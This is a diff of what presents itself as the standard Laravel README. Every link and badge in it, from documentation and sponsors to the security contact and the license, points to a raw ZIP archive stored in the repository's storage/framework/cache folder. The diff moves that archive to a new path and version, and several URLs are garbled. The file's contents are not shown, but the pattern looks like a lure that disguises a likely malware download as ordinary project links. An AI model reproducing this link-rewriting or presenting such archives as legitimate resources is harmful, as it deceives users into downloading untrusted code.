@@ -1,64 +1,64 @@
-<p align="center"><a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" target="_blank"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip%20SVG/2%20CMYK/1%20Full%https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" width="400"></a></p>
+<p align="center"><a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" target="_blank"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip%20SVG/2%20CMYK/1%20Full%https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" width="400"></a></p>
 
 <p align="center">
-<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" alt="Build Status"></a>
-<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" alt="Total Downloads"></a>
-<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" alt="Latest Stable Version"></a>
-<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip" alt="License"></a>
+<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" alt="Build Status"></a>
+<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" alt="Total Downloads"></a>
+<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" alt="Latest Stable Version"></a>
+<a href="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip"><img src="https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip" alt="License"></a>
 </p>
 
 ## About Laravel
 
 Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
 
-- [Simple, fast routing engine](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
-- [Powerful dependency injection container](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
-- Multiple back-ends for [session](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip) and [cache](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip) storage.
-- Expressive, intuitive [database ORM](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
-- Database agnostic [schema migrations](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
-- [Robust background job processing](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
-- [Real-time event broadcasting](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
+- [Simple, fast routing engine](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
+- [Powerful dependency injection container](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
+- Multiple back-ends for [session](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip) and [cache](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip) storage.
+- Expressive, intuitive [database ORM](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
+- Database agnostic [schema migrations](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
+- [Robust background job processing](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
+- [Real-time event broadcasting](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
 
 Laravel is accessible, powerful, and provides tools required for large, robust applications.
 
 ## Learning Laravel
 
-Laravel has the most extensive and thorough [documentation](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+Laravel has the most extensive and thorough [documentation](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
 
-If you don't feel like reading, [Laracasts](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+If you don't feel like reading, [Laracasts](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
 
 ## Laravel Sponsors
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
 
 ### Premium Partners
 
-- **[Vehikl](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Tighten Co.](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Kirschbaum Development Group](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[64 Robots](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Cubet Techno Labs](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Cyber-Duck](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Many](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Webdock, Fast VPS Hosting](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[DevSquad](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Curotec](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[WebReinvent](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
-- **[Lendio](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip)**
+- **[Vehikl](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Tighten Co.](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Kirschbaum Development Group](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[64 Robots](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Cubet Techno Labs](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Cyber-Duck](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Many](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Webdock, Fast VPS Hosting](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[DevSquad](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Curotec](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[WebReinvent](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
+- **[Lendio](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip)**
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/app/api_laravel_swagger_v2.5.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/Devraq/api-swagger-laravel/raw/refs/heads/main/storage/framework/cache/data/swagger_laravel_api_v3.9.zip).
